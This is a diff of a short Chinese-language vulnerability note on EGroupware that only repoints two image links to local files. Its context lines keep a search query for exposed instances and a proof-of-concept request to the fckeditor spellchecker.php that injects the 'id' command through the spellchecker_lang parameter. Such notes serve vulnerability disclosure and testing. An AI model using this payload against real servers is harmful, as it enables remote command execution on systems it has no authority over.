@@ -20,7 +20,7 @@ app="EGROUPWARE-产品"
 
 登录页面
 
-![image-20220524171233435](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241712519.png)
+![image-20220524171233435](./images/202205241712519.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="EGROUPWARE-产品"
 /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C
 ```
 
-![image-20220524171251702](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241712784.png)
+![image-20220524171251702](./images/202205241712784.png)
